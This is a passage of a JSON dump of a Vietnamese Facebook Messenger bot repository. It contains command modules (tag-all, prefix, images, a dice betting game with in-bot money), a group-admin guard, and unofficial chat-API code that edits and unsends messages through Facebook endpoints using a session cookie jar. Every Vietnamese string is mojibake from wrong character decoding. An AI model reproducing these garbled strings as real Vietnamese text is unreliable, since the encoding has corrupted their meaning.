${gio}:${phut}:${giay}`, threadID), 0\n      );\n      setTimeout(() => \n          api.sendMessage(\"B·∫Øt ƒë·∫ßu kh·ªüi ƒë·ªông l·∫°i...\", event.threadID, () => process.exit(1)), \n          1000 * `${time}`\n      );\n  }\n};\n","path":null,"size_bytes":1465,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/testv2.js":{"content":"const crypto = require('crypto')\nconst RandPass = Array.from({length: 101}, (_,i) => crypto.randomBytes(5).toString('hex'));\nconsole.log(RandPass)","path":null,"size_bytes":146,"size_tokens":null},"modules/commands/ping.js":{"content":"module.exports.config = {\n\tname: \"ping\",\n\tversion: \"1.0.4\",\n\thasPermssion: 1,\n\tcredits: \"Mirai Team\",\n\tdescription: \"tag to√†n b·ªô th√†nh vi√™n\",\n\tcommandCategory: \"Qu·∫£n L√≠ Box\",\n\tusages: \"[Text]\",\n\tcooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args}) {\n\ttry {\n\t\tconst botID = api.getCurrentUserID();\n\t\tconst listUserID = event.participantIDs.filter(ID => ID != botID && ID != event.senderID);\n\t\tvar body = (args.length != 0) ? args.join(\" \") : \"C√°c con v·ª£ d·∫≠y t∆∞∆°ng t√°c:3\", mentions = [], index = 0;\n\t\t\n    for(const idUser of listUserID) {\n\n\t\t\t  body = \"‚Äé\" + body;\n\t\t\t  mentions.push({ id: idUser, tag: \"‚Äé\", fromIndex: index - 1 });\n\t\t\t  index -= 1;\n      \n\t\t}\n    \n\t\t  return api.sendMessage({ body, mentions }, event.threadID, event.messageID);\n\n\t}\n\tcatch (e) { return console.log(e); }\n}","path":null,"size_bytes":829,"size_tokens":null},"modules/commands/prefix.js":{"content":"module.exports.config = {\n  name: \"prefix\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"tpk\",\n  description: \"Xem prefix c·ªßa BOT\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"\",\n  cooldowns: 5,\n};\n\nmodule.exports.handleEvent = async ({ event, api, Threads }) => {\n  var os = require(\"os\");\n  var cpus = os.cpus();\n  var chips;\n  for (var i of cpus) chips = i.model, speed = i.speed;\n  if (cpus == undefined);\n  var { threadID, messageID, body, senderID } = event;\n  //if (senderID == global.data.botID) return;\n  if ((this.config.credits) != \"tpk\") { return api.sendMessage(`Sai credits!`, threadID, messageID)}\n  function out(data) {\n    api.sendMessage(data, threadID, messageID)\n  }\n  var dataThread = (await Threads.getData(threadID));\n  var data = dataThread.data; \n  const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};\n\n  var arr = [\"mpre\",\"mprefix\",\"prefix\", \"d·∫•u l·ªánh\", \"prefix c·ªßa bot l√† g√¨\",\"daulenh\", \"d√πng sao\"];\n  arr.forEach(i => {\n    let str = i[0].toUpperCase() + i.slice(1);\n    if (body === i.toUpperCase() | body === i | str === body) {\n    const prefix = threadSetting.PREFIX || global.config.PREFIX;\n      if (data.PREFIX == null) {\n        return out(`====„Äé ùó£ùó•ùóòùóôùóúùó´ „Äè====\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n[ ${prefix} ] ùó°ùóµùóºÃÅùó∫ ùó∞ùóµùòÇÃõùóÆ ùòÖùó≤ÃÅùòÅ ùóΩùóøùó≤ùó≥ùó∂ùòÖ ùó∫ùóºÃõÃÅùó∂ ùó∞ùóµùóº ùóØùóºùòÅ\\n\\nüå∏ ùóñùóºÃÅ ùòÅùóµùó≤ÃÇÃâ ùó±ùòÇÃÄùóªùó¥ ùòÄùó≤ùòÅùóΩùóøùó≤ùó≥ùó∂ùòÖ + ùóΩùóøùó≤ùó≥ùó∂ùòÖ ùóØùóÆÃ£ùóª ùó∫ùòÇùóºÃÇÃÅùóª ùòÄùó≤ùòÅ ùòÄùó≤ùòÅùóΩùóøùó≤ùó≥ùó∂ùòÖ ùóøùó≤ùòÄùó≤ùòÅ ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÉùó≤ÃÇÃÄ ùóΩùóøùó≤ùó≥ùó∂ùòÖ ùó∞ùòÇÃÉ`)\n      }\n      else return out('====„Äé ùó£ùó•ùóòùóôùóúùó´ „Äè====\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n‚Üí ùó£ùóøùó≤ùó≥ùó∂ùòÖ ùóµùó∂ùó≤Ã£ÃÇùóª ùòÅùóÆÃ£ùó∂ ùó∞ùòÇÃâùóÆ ùóªùóµùóºÃÅùó∫: ' + data.PREFIX + '\\n‚Üí ùó£ùóøùó≤ùó≥ùó∂ùòÖ ùó∫ùóÆÃ£ÃÜùó∞ ƒëùó∂Ã£ùóªùóµ ùòÅùóøùó≤ÃÇùóª ùóµùó≤Ã£ÃÇ ùòÅùóµùóºÃÇÃÅùóªùó¥ ùóØùóºùòÅ: ' + prefix + `\\n\\nüå∏ ùóñùóºÃÅ ùòÅùóµùó≤ÃÇÃâ ùó±ùòÇÃÄùóªùó¥ ùòÄùó≤ùòÅùóΩùóøùó≤ùó≥ùó∂ùòÖ + ùóΩùóøùó≤ùó≥ùó∂ùòÖ ùóØùóÆÃ£ùóª ùó∫ùòÇùóºÃÇÃÅùóª ùòÄùó≤ùòÅ ùòÄùó≤ùòÅùóΩùóøùó≤ùó≥ùó∂ùòÖ ùóøùó≤ùòÄùó≤ùòÅ ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÉùó≤ÃÇÃÄ ùóΩùóøùó≤ùó≥ùó∂ùòÖ ùó∞ùòÇÃÉ`)\n    }\n\n  });\n};\n\nmodule.exports.run = async({ event, api }) => {\n    return api.sendMessage(\"üòº\", event.threadID)\n}","path":null,"size_bytes":2585,"size_tokens":null},"lib/fca-auto/src/editMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function editMessage(messageID, changedText, threadID, callback) {\n        if (!messageID || !changedText || !threadID) {\n            throw new Error(\"Missing required parameters.\");\n        }\n\n        try {\n            ctx.mqttClient.publish('/ls_req', \n                JSON.stringify({\n                    app_id: \"2220391788200892\",\n                    payload: JSON.stringify({\n                        tasks: [{\n                            label: '742',\n                            payload: JSON.stringify({\n                                message_id: messageID,\n                                text: changedText\n                            }),\n                            queue_name: 'edit_message',\n                            task_id: Math.floor(Math.random() * 1001),\n                            failure_count: null,\n                        }],\n                        epoch_id: utils.generateOfflineThreadingID(),\n                        version_id: '7992185107461798',\n                    }),\n                    request_id: ctx.req_ID ? ++ctx.req_ID : (ctx.req_ID = 1),\n                    type: 3\n                }),\n                {\n                    qos: 1,\n                    retain: false\n                }\n            );\n\n            if (callback) callback(null);\n            return true;\n        } catch (error) {\n            if (callback) callback(error);\n            return false;\n        }\n    };\n};","path":null,"size_bytes":1574,"size_tokens":null},"includes/database/index.js":{"content":"const Sequelize = require(\"sequelize\");\r\nconst { resolve } = require(\"path\");\r\nconst { DATABASE } = global.config;\r\n\r\nvar dialect = Object.keys(DATABASE), storage;\r\ndialect = dialect[0]; \r\nstorage = resolve(__dirname, `../${DATABASE[dialect].storage}`);\r\n\r\nmodule.exports.sequelize = new Sequelize({\r\n\tdialect,\r\n\tstorage,\r\n\tpool: {\r\n\t\tmax: 20,\r\n\t\tmin: 0,\r\n\t\tacquire: 60000,\r\n\t\tidle: 20000\r\n\t},\r\n\tretry: {\r\n\t\tmatch: [\r\n\t\t\t/SQLITE_BUSY/,\r\n\t\t],\r\n\t\tname: 'query',\r\n\t\tmax: 20\r\n\t},\r\n\tlogging: false,\r\n\ttransactionType: 'IMMEDIATE',\r\n\tdefine: {\r\n\t\tunderscored: false,\r\n\t\tfreezeTableName: true,\r\n\t\tcharset: 'utf8',\r\n\t\tdialectOptions: {\r\n\t\t\tcollate: 'utf8_general_ci'\r\n\t\t},\r\n\t\ttimestamps: true\r\n\t},\r\n\tsync: {\r\n\t\tforce: false\r\n\t}\r\n});\r\n\r\nmodule.exports.Sequelize = Sequelize;","path":null,"size_bytes":765,"size_tokens":null},"modules/commands/cat.js":{"content":"module.exports.config = {\n\tname: \"cat\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"VDT&NTH\",\n\tdescription: \"m√®o\",\n\tcommandCategory: \"Random-img\",\n\tusages: \"cat [Text]\",\n\tcooldowns: 30,\n\t\n\t};\n\t\t\t\nmodule.exports.run = async ({ api, event }) => {\n\tconst axios = require('axios');\n\tconst request = require('request');\n\tconst fs = require(\"fs\");\n\taxios.get('https://nekos.life/api/v2/img/meow').then(res => {\n\tlet ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n\t\n\tlet callback = function () {\n\t\t\t\t\tapi.sendMessage({\n\t\t\t\t\t\tattachment: fs.createReadStream(__dirname + `/cache/dog.${ext}`)\n\t\t\t\t\t}, event.threadID, () => fs.unlinkSync(__dirname + `/cache/dog.${ext}`), event.messageID);\n\t\t\t\t};\n\t\t\t\trequest(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/dog.${ext}`)).on(\"close\", callback);\n\t\t\t})\n}","path":null,"size_bytes":825,"size_tokens":null},"modules/commands/nhomnguyentu.js":{"content":"module.exports.config = {\n\tname: \"nhomnguyentu\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"LeMinh\",\n\tdescription: \"Nh√≥m nguy√™n t·ª≠\",\n\tcommandCategory: \"Ki·∫øn Th·ª©c\",\n\tcooldowns: 0\n};\n\nmodule.exports.run = ({ event, api }) => api.sendMessage(`B·∫£ng h√≥a tr·ªã m·ªôt s·ªë nh√≥m nguy√™n t·ª≠\nT√™n/Ho√° tr·ªã/G·ªëc axit/Axit t∆∞∆°ng ·ª©ng/T√≠nh axit\nHiƒëroxit(*)(OH);Nitrat(NO3);Clorua(Cl) / I / NO3 / HNO3 / MaÃ£nh\nSunfat(SO4);Cacbonat(CO3) /II / SO4 / H2SO4 / MaÃ£nh\nPhotphat(PO4) / III / Cl / HCl / MaÃ£nh \n(*):T√™n n√†y d√πng trong c√°c h·ª£p ch·∫•t v·ªõi kim lo·∫°i.`, event.threadID, event.messageID);\n","path":null,"size_bytes":616,"size_tokens":null},"modules/commands/6mui.js":{"content":"module.exports.config = {\n  name: \"6mui\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan (modified by ChatGPT)\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 20\n};\n\nmodule.exports.run = async ({ api, event }) => {\n  const axios = require('axios');\n  const fs = require(\"fs\");\n  const path = require(\"path\");\n  const girl = require('./../../img/mui.json');\n\n  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));\n  let imagesToDownload = [];\n\n  for (let i = 0; i < 4; i++) {\n    let image = girl[Math.floor(Math.random() * girl.length)].trim();\n    imagesToDownload.push(image);\n  }\n\n  async function downloadImages() {\n    for (let i = 0; i < imagesToDownload.length; i++) {\n      const url = imagesToDownload[i];\n      const fileName = path.join(__dirname, `${i + 1}.png`);\n      try {\n        const response = await axios({\n          method: 'get',\n          url: url,\n          responseType: 'stream',\n          headers: {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'\n          }\n        });\n\n        await new Promise((resolve, reject) => {\n          const writer = fs.createWriteStream(fileName);\n          response.data.pipe(writer);\n          writer.on('finish', resolve);\n          writer.on('error', reject);\n        });\n\n        await delay(3000); // T·∫°m d·ª´ng 3 gi√¢y gi·ªØa m·ªói l·∫ßn t·∫£i\n\n      } catch (error) {\n        console.error(`Error downloading image ${i + 1}:`, error.message || error);\n      }\n    }\n\n    sendImages();\n  }\n\n  function sendImages() {\n    const attachments = [];\n    for (let i = 1; i <= 4; i++) {\n      const filePath = path.join(__dirname, `${i}.png`);\n      if (fs.existsSync(filePath)) {\n        attachments.push(fs.createReadStream(filePath));\n      }\n    }\n\n    api.sendMessage({\n      body: 'Six m√∫i c·ªßa b√© ƒë√¢y:3',\n      attachment: attachments\n    }, event.threadID, () => {\n      for (let i = 1; i <= 4; i++) {\n        const filePath = path.join(__dirname, `${i}.png`);\n        if (fs.existsSync(filePath)) {\n          fs.unlinkSync(filePath);\n        }\n      }\n    }, event.messageID);\n  }\n\n  await downloadImages();\n};\n","path":null,"size_bytes":2175,"size_tokens":null},"modules/commands/idbox.js":{"content":"module.exports.config = {\n  name: \"idbox\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"manhIT\",\n  description: \"l·∫•y ID nh√≥m chat.\",\n  commandCategory: \"Nh√≥m\",\n  usages: \"\",\n  cooldowns: 5,\n  dependencies: {\n\n  }\n};\n\nmodule.exports.run = async({api,event, Threads}) => {\n    return api.sendMessage(`${event.threadID}`, event.threadID, event.messageID);\n}","path":null,"size_bytes":364,"size_tokens":null},"modules/commands/tx.js":{"content":"const fs = require(\"fs\");\nconst path = require(\"path\");\nconst moment = require(\"moment-timezone\");\n\nmodule.exports.config = {\n  name: \"tx\",\n  version: \"0.0.2\",\n  hasPermssion: 0,\n  credits: \"hahh\",\n  description: \"Ch∆°i t√†i x·ªâu d√πng ·∫£nh local\",\n  commandCategory: \"Tr√≤ Ch∆°i\",\n  usages: \"tx t√†i/x·ªâu s·ªë ti·ªÅn\",\n  cooldowns: 10\n};\n\nvar tilethang = 1;\nvar tilethangb3dn = 5;\nvar tilethangb2dn = 3;\nvar timedelay = 2;\nvar haisogiong = 2;\nvar basogiong = 2;\nvar motsogiong = 1;\n\nfunction replace(int) {\n  return int.toString().replace(/(.)(?=(\\d{3})+$)/g, '$1,');\n}\n\nfunction getImagePath(number) {\n  return path.join(__dirname, \"data\", \"taixiu\", `${number}.jpeg`);\n}\n\nfunction getRATE(tong) {\n  return (tong >= 4 && tong <= 17) ? 20 : 0;\n}\n\nmodule.exports.run = async function ({ event, api, Currencies, Users, args }) {\n  try {\n    const { increaseMoney, decreaseMoney } = Currencies;\n    const { threadID, messageID, senderID } = event;\n    const { sendMessage } = api;\n    const name = await Users.getNameUser(senderID);\n    const money = (await Currencies.getData(senderID)).money;\n    const bet = parseInt((args[1] === \"all\" ? money : args[1]));\n    const input = args[0];\n    const tong = parseInt(args[2]);\n\n    if (!input) return sendMessage(\"‚ùå B·∫°n ch∆∞a nh·∫≠p t√†i/x·ªâu/b3gn/b2gn/cuoctong/cuocso\", threadID, messageID);\n    if (!bet || isNaN(bet) || bet < 1000) return sendMessage(\"‚ùå Ti·ªÅn c∆∞·ª£c ph·∫£i t·ª´ 1000 tr·ªü l√™n\", threadID, messageID);\n    if (bet > money) return sendMessage(\"‚ùå B·∫°n kh√¥ng ƒë·ªß ti·ªÅn ƒë·ªÉ c∆∞·ª£c\", threadID, messageID);\n\n    const inputMap = {\n      \"t√†i\": \"t√†i\", \"T√†i\": \"t√†i\", \"-t\": \"t√†i\",\n      \"x·ªâu\": \"x·ªâu\", \"X·ªâu\": \"x·ªâu\", \"-x\": \"x·ªâu\",\n      \"b3gn\": \"b3gn\", \"bbgn\": \"b3gn\", \"btgn\": \"b3gn\",\n      \"b2gn\": \"b2gn\", \"bdgn\": \"b2gn\", \"bhgn\": \"b2gn\",\n      \"cuoctong\": \"cuoctong\", \"ct\": \"cuoctong\",\n      \"cuocso\": \"cuocso\", \"cs\": \"cuocso\"\n    };\n\n    const choose = inputMap[input];\n    if (!choose) return sendMessage(\"‚ùå Sai tag\", threadID, messageID);\n    if (choose === 'cuoctong' && (tong < 4 || tong > 17)) return sendMessage(\"‚ùå T·ªïng c∆∞·ª£c kh√¥ng h·ª£p l·ªá\", threadID, messageID);\n    if (choose === 'cuocso' && (tong < 1 || tong > 6)) return sendMessage(\"‚ùå S·ªë ch·ªçn kh√¥ng h·ª£p l·ªá\", threadID, messageID);\n\n    const number = [];\n    const img = [];\n\n    for (let i = 0; i < 3; i++) {\n      const n = Math.floor(Math.random() * 6 + 1);\n      number.push(n);\n\n      const imagePath = getImagePath(n);\n      if (fs.existsSync(imagePath)) {\n        img.push(fs.createReadStream(imagePath));\n      }\n    }\n\n    const total = number.reduce((a, b) => a + b, 0);\n    let ans, result, mn, mne;\n\n    if (choose === 'cuocso') {\n      const count = number.filter(n => n === tong).length;\n      if (count === 3) {\n        result = 'win'; mn = bet * basogiong;\n      } else if (count === 2) {\n        result = 'win'; mn = bet * haisogiong;\n      } else if (count === 1) {\n        result = 'win'; mn = bet * motsogiong;\n      } else {\n        result = 'lose'; mn = bet;\n      }\n      ans = tong;\n    } else if (choose === 'cuoctong') {\n      if (total === tong) {\n        result = 'win'; mn = bet * getRATE(tong);\n      } else {\n        result = 'lose'; mn = bet;\n      }\n      ans = total;\n    } else if (choose === 'b3gn') {\n      if (number[0] === number[1] && number[1] === number[2]) {\n        result = 'win'; mn = bet * tilethangb3dn;\n        ans = \"b·ªô ba ƒë·ªìng nh·∫•t\";\n      } else {\n        result = 'lose'; mn = bet;\n        ans = (total >= 11) ? \"t√†i\" : \"x·ªâu\";\n      }\n    } else if (choose === 'b2gn') {\n      const isB2 = number[0] === number[1] || number[1] === number[2] || number[0] === number[2];\n      if (isB2) {\n        result = 'win'; mn = bet * tilethangb2dn;\n        ans = \"b·ªô hai ƒë·ªìng nh·∫•t\";\n      } else {\n        result = 'lose'; mn = bet;\n        ans = (total >= 11) ? \"t√†i\" : \"x·ªâu\";\n      }\n    } else {\n      const isTriple = number[0] === number[1] && number[1] === number[2];\n      ans = isTriple ? \"b·ªô ba ƒë·ªìng nh·∫•t\" : (total >= 11 ? \"t√†i\" : \"x·ªâu\");\n      if (isTriple || ans !== choose) {\n        result = 'lose'; mn = bet;\n      } else {\n        result = 'win'; mn = bet * tilethang;\n      }\n    }\n\n    mne = (result === 'win') ? money + mn : money - mn;\n    if (result === 'win') increaseMoney(senderID, mn);\n    else decreaseMoney(senderID, mn);\n\n    const msg = `üé≤ ùóßùóîÃÄùóú ùó´ùóúÃâùó® üé≤\n[üë§] Ng∆∞·ªùi ch∆°i: ${name}\n[üéØ] Ch·ªçn: ${choose}\n[üé≤] T·ªïng: ${total} (${ans})\n[üíµ] ƒê·∫∑t c∆∞·ª£c: ${replace(bet)}$\n[üìä] K·∫øt qu·∫£: ${result === 'win' ? 'Th·∫Øng' : 'Thua'}\n[üí∞] S·ªë d∆∞ hi·ªán t·∫°i: ${replace(mne)}$`;\n\n    return sendMessage({ body: msg, attachment: img }, threadID, messageID);\n\n  } catch (e) {\n    console.error(e);\n    api.sendMessage(\"‚ùå ƒê√£ x·∫£y ra l·ªói\", event.threadID, event.messageID);\n  }\n};\n","path":null,"size_bytes":4895,"size_tokens":null},"modules/events/chongcuopbox.js":{"content":"module.exports.config = {\n    name: \"guard\",\n    eventType: [\"log:thread-admins\"],\n    version: \"1.0.0\",\n    credits: \"D-Jukie\",\n    description: \"NgƒÉn ch·∫∑n vi·ªác thay ƒë·ªïi admin\",\n};\n\nmodule.exports.run = async function ({ event, api, Threads, Users }) {\n    const { logMessageType, logMessageData, senderID } = event;\n \tlet data = (await Threads.getData(event.threadID)).data\n \tif (data.guard == false) return;\n    if (data.guard == true ) {\n        switch (logMessageType) {\n          case \"log:thread-admins\": {\n            if (logMessageData.ADMIN_EVENT == \"add_admin\") {\n              if(event.author == api.getCurrentUserID()) return\n              if(logMessageData.TARGET_ID == api.getCurrentUserID()) return\n              else {\n                api.changeAdminStatus(event.threadID, event.author, false, editAdminsCallback)\n                api.changeAdminStatus(event.threadID, logMessageData.TARGET_ID, false)\n                function editAdminsCallback(err) {\n                  if (err) return api.sendMessage(\"‚Üí ùêáùê¢ùê°ùê¢ùê°ùê¢ùê°ùê¢ùê°! \", event.threadID, event.messageID);\n                    return api.sendMessage(`‚Üí ùêäùê¢ÃÅùêúùê° ùê°ùê®ùêöÃ£ùê≠ ùêúùê°ùêûÃÇÃÅ ƒëùê®Ã£ÃÇ ùêúùê°ùê®ÃÇÃÅùêßùê† ùêúùêÆÃõùê®ÃõÃÅùê© ùêõùê®ùê±`, event.threadID, event.messageID);\n                }\n              }\n            }\n            else if (logMessageData.ADMIN_EVENT == \"remove_admin\") {\n              if(event.author == api.getCurrentUserID()) return\n              if(logMessageData.TARGET_ID == api.getCurrentUserID()) return\n              else {\n                api.changeAdminStatus(event.threadID, event.author, false, editAdminsCallback)\n                api.changeAdminStatus(event.threadID, logMessageData.TARGET_ID, true)\n                function editAdminsCallback(err) {\n                if (err) return api.sendMessage(\"‚Üí ùêáùê¢ùê°ùê¢ùê°ùê¢ùê°ùê¢ùê°! \", event.threadID, event.messageID);\n                return api.sendMessage(`‚Üí ùêäùê¢ÃÅùêúùê° ùê°ùê®ùêöÃ£ùê≠ ùêúùê°ùêûÃÇÃÅ ƒëùê®Ã£ÃÇ ùêúùê°ùê®ÃÇÃÅùêßùê† ùêúùêÆÃõùê®ÃõÃÅùê© ùêõùê®ùê±`, event.threadID, event.messageID);\n              }\n            }\n          }\n        }\n      }\n    }\n}\n","path":null,"size_bytes":2231,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/handleMessageRequest.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (/** @type {{ post: any; postFormData?: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; get?: (arg0: any, arg1: any) => Promise<any>; }} */ defaultFuncs, /** @type {any} */ api, /** @type {{ jar: any; fb_dtsg?: string; ttstamp?: string; }} */ ctx) {\n  return function handleMessageRequest(/** @type {string | any[]} */ threadID, /** @type {any} */ accept, /** @type {((err: any, data: any) => void) | ((arg0: undefined) => any)} */ callback) {\n    if (utils.getType(accept) !== \"Boolean\") throw { error: \"Please pass a boolean as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (/** @type {any} */ err, /** @type {any} */ data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n    var messageBox = accept ? \"inbox\" : \"other\";\n\n    for (var i = 0; i < threadID.length; i++) form[messageBox + \"[\" + i + \"]\"] = threadID[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/move_thread.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (/** @type {{ error: any; }} */ resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (/** @type {string} */ err) {\n        log.error(\"handleMessageRequest\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1794,"size_tokens":null},"lib/fca-auto/src/unsendMessage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  /**\n   * Unsends (deletes) a message by message ID.\n   * @param {string} messageID Message ID to unsend.\n   * @param {Function} callback Called when the message is unsent.\n   */\n  return async function unsendMessage(messageID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function(resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function(err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    // C√°c ph∆∞∆°ng th·ª©c unsend kh√°c nhau\n    const unsendMethods = {\n      // Ph∆∞∆°ng th·ª©c 1: GraphQL API (ph∆∞∆°ng th·ª©c ch√≠nh)\n      async graphql() {\n        try {\n          const form = {\n            message_id: messageID,\n            client_mutation_id: messageID\n          };\n\n          const res = await defaultFuncs\n            .post(\"https://www.facebook.com/messaging/unsend_message/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n          if (res.error) throw res;\n          return true;\n        } catch (error) {\n          log.error(\"Failed to unsend using GraphQL:\", error);\n          return false;\n        }\n      },\n\n      // Ph∆∞∆°ng th·ª©c 2: Messenger API\n      async messenger() {\n        try {\n          const form = {\n            message_id: messageID,\n            source: \"source:messenger:web\"\n          };\n\n          const res = await defaultFuncs\n            .post(\"https://www.messenger.com/messaging/unsend_message/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n          if (res.error) throw res;\n          return true;\n        } catch (error) {\n          log.error(\"Failed to unsend using Messenger:\", error);\n          return false;\n        }\n      },\n\n      // Ph∆∞∆°ng th·ª©c 3: Legacy API \n      async legacy() {\n        try {\n          const form = {\n            message_id: messageID,\n            action_type: \"unsend_message\",\n            is_async: true\n          };\n\n          const res = await defaultFuncs\n            .post(\"https://www.facebook.com/ajax/mercury/delete_messages.php\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n          if (res.error) throw res;\n          return true;\n        } catch (error) {\n          log.error(\"Failed to unsend using Legacy:\", error);\n          return false;\n        }\n      },\n\n      // Ph∆∞∆°ng th·ª©c 4: Mobile API\n      async mobile() {\n        try {\n          const form = {\n            message_id: messageID\n          };\n\n          const res = await defaultFuncs\n            .post(\"https://m.facebook.com/messages/unsend_message/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n          if (res.error) throw res;\n          return true;\n        } catch (error) {\n          log.error(\"Failed to unsend using Mobile:\", error);\n          return false;\n        }\n      }\n    };\n\n    // Th·ª≠ t·ª´ng ph∆∞∆°ng th·ª©c theo th·ª© t·ª± cho ƒë·∫øn khi th√†nh c√¥ng\n    try {\n      // Th·ª≠ ph∆∞∆°ng th·ª©c ch√≠nh (GraphQL) tr∆∞·ªõc\n      if (await unsendMethods.graphql()) {\n        return callback();\n      }\n\n      // N·∫øu th·∫•t b·∫°i, th·ª≠ Messenger API\n      if (await unsendMethods.messenger()) {\n        return callback();\n      }\n\n      // N·∫øu th·∫•t b·∫°i, th·ª≠ Legacy API\n      if (await unsendMethods.legacy()) {\n        return callback();\n      }\n\n      // Cu·ªëi c√πng th·ª≠ Mobile API\n      if (await unsendMethods.mobile()) {\n        return callback();\n      }\n\n      // N·∫øu t·∫•t c·∫£ ƒë·ªÅu th·∫•t b·∫°i\n      throw {error: \"Kh√¥ng th·ªÉ g·ª° tin nh·∫Øn b·∫±ng b·∫•t k·ª≥ ph∆∞∆°ng th·ª©c n√†o\"};\n\n    } catch (err) {\n      log.error(\"unsendMessage\", err);\n      return callback(err);\n    }\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":3981,"size_tokens":null},"modules/commands/admin.js":{"content":"module.exports.config = {\n\tname: \"admin\",\n\tversion: \"1.0.5\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",//mod l·∫°i to√†n b·ªô l·ªánh by JRT\n\tdescription: \"B·∫≠t t·∫Øt ch·∫ø ƒë·ªô ch·ªâ qtv d√πng l·ªánh\",\n\tcommandCategory: \"H·ªá Th·ªëng\",\n\tusages: \"B·∫≠t t·∫Øt ch·∫ø ƒë·ªô ch·ªâ admin v√† qtv d√πng l·ªánh\",\n    cooldowns: 0,\n    dependencies: {\n        \"fs-extra\": \"\"\n    }\n};\nmodule.exports.languages = {\n    \"vi\": {\n        \"listAdmin\": ` ADMINBOT \\n\\n%1`,\n        \"listNDH\": `  SUPPORTBOT  \\n\\n%1`,\n        \"notHavePermssion\": ' B·∫°n kh√¥ng ƒë·ªß quy·ªÅn h·∫°n ƒë·ªÉ c√≥ th·ªÉ s·ª≠ d·ª•ng ch·ª©c nƒÉng \"%1\"',\n        \"addedNewAdmin\": ' ƒê√£ th√™m %1 ng∆∞·ªùi d√πng tr·ªü th√†nh ADMINBOT:\\n\\n%2',\n        \"removedAdmin\": ' ƒê√£ g·ª° b·ªè %1 ng∆∞·ªùi ƒëi·ªÅu h√†nh adminbot:\\n\\n%2',\n        \"removedAdminSupport\": 'ƒê√£ g·ª° b·ªè %1 ng∆∞·ªùi ƒëi·ªÅu h√†nh Support Bot:\\n\\n%2',\n        \"adminsupport\":  ' ƒê√£ th√™m %1 ng∆∞·ªùi d√πng tr·ªü th√†nh ng∆∞·ªùi h·ªó tr·ª£  ng∆∞·ªùi ƒëi·ªÅu h√†nh bot:\\n\\n%2'\n    },\n    \"en\": {\n        \"listAdmin\": '[Admin] Admin list: \\n\\n%1',\n        \"notHavePermssion\": '[Admin] You have no permission to use \"%1\"',\n        \"addedNewAdmin\": '[Admin] Added %1 Admin :\\n\\n%2',\n        \"removedAdmin\": '[Admin] Remove %1 Admin:\\n\\n%2'\n    }\n}\nmodule.exports.onLoad = function() {\n    const { writeFileSync, existsSync } = require('fs-extra');\n    const { resolve } = require(\"path\");\n    const path = resolve(__dirname, 'cache', 'data.json');\n    if (!existsSync(path)) {\n        const obj = {\n            adminbox: {}\n        };\n        writeFileSync(path, JSON.stringify(obj, null, 4));\n    } else {\n        const data = require(path);\n        if (!data.hasOwnProperty('adminbox')) data.adminbox = {};\n        writeFileSync(path, JSON.stringify(data, null, 4));\n    }\n}\nmodule.exports.run = async function ({ api, event, args, Users, permssion, getText }) {\n    const content = args.slice(1, args.length);\n  const moment = require(\"moment-timezone\"); \n    var timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss\")\n    if (args.length == 0) return api.sendMessage(`=== „Äé ùöåùöäÃÅùöåùöë 